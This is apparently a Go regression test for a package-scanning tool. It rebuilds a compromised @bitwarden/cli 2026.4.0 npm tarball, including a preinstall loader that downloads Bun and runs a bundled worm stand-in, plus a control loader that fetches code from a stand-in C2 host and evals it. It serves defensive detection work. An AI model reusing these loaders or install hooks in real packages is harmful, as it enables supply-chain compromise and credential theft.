package cli

// Attack 2026-24: @bitwarden/cli 2026.4.0 (2026-04-22, live 93 minutes,
// MAL-2026-3020). Published through a compromised GitHub Actions path in
// Bitwarden's CI (TeamPCP / Checkmarx campaign). Every earlier release had no
// install script; 2026.4.0 added "preinstall": "node bw_setup.js", a clean-
// looking loader that downloads Bun 1.3.13 from oven-sh/bun releases and runs
// bw1.js (~10 MB, one minified line, strings scrambled by __decodeScrambled
// seed 0x3039), a worm that scrapes Runner.Worker memory and exfiltrates to
// audit.checkmarx[.]cx.
//
// Install-guard bytes: refused since v0.22.106 (F11). bw_setup.js fetches Bun
// and runs the bundled bw1.js with it, which ScanReferencedBody now escalates
// (runsBundledScriptUnderForeignRuntime; before, fetch-to-disk + run-a-local-
// file stayed present, see TestCacheableCampaignReferencedScript). bw1.js
// carries no plaintext IOC. The malware feed (MAL-2026-3020, core/malware
// test) and a release-age hold (live 93 minutes) still refuse it too.

import (
	"strings"
	"testing"
)

const atk24Setup = `const fs=require("fs"),path=require("path"),{execFileSync,execSync}=require("child_process");
const https=require("https");
function hasBun(){try{execSync("bun --version",{stdio:"ignore"});return true}catch(e){return false}}
function dl(u,d,cb){https.get(u,r=>{if(r.statusCode>=300&&r.headers.location)return dl(r.headers.location,d,cb);const f=fs.createWriteStream(d);r.pipe(f);f.on("finish",()=>f.close(cb))})}
const url="https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-"+process.platform+"-"+process.arch+".zip";
if(hasBun()){execFileSync("bun",[path.join(__dirname,"bw1.js")],{stdio:"inherit"})}else{dl(url,"bun.zip",()=>{execSync("unzip -o bun.zip");fs.chmodSync("./bun",0o755);execFileSync("./bun",[path.join(__dirname,"bw1.js")],{stdio:"inherit"})})}
`

// atk24Worm is a defanged bw1.js stand-in: minified, every string behind a
// scrambler, no plaintext host.
func atk24Worm() string {
	var b strings.Builder
	b.WriteString(`function __decodeScrambled(s,k){k=k||0x3039;var o="";for(var i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)^(k>>(i%8)&255));return o}`)
	for i := 0; i < 2000; i++ {
		b.WriteString(`var a` + strings.Repeat("x", i%7) + `=__decodeScrambled("ABqzrt");`)
	}
	return b.String()
}

func TestAttack2026_24_BitwardenCLIBytes(t *testing.T) {
	bad := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"@bitwarden/cli","version":"2026.4.0","bin":{"bw":"bw_setup.js"},"scripts":{"preinstall":"node bw_setup.js"}}`,
		"package/bw_setup.js":  atk24Setup,
		"package/bw1.js":       atk24Worm(),
		"package/build/bw.js":  "module.exports=function(){};\n",
	})
	if v := analyzeArtifact("npm", bad); !v.Block {
		t.Fatalf("2026.4.0 bytes must be refused since v0.22.106 (F11), got %+v", v)
	}

	// Negative control: the earlier releases had no install script.
	clean := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"@bitwarden/cli","version":"2026.3.0","bin":{"bw":"build/bw.js"}}`,
		"package/build/bw.js":  "module.exports=function(){};\n",
	})
	if v := analyzeArtifact("npm", clean); v.Block || v.Severity != "" {
		t.Fatalf("2026.3.0 flagged: %+v", v)
	}

	// Control: the detector is live — the same hook running a loader that
	// fetches and evals is refused.
	evalLoader := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"@bitwarden/cli","version":"2026.4.0","scripts":{"preinstall":"node bw_setup.js"}}`,
		"package/bw_setup.js":  `require("https").get("https://c2.example.invalid/s",r=>{let b="";r.on("data",c=>b+=c);r.on("end",()=>eval(b))});`,
	})
	if v := analyzeArtifact("npm", evalLoader); !v.Block {
		t.Fatalf("control: fetch+eval preinstall loader must be refused, got %+v", v)
	}
}
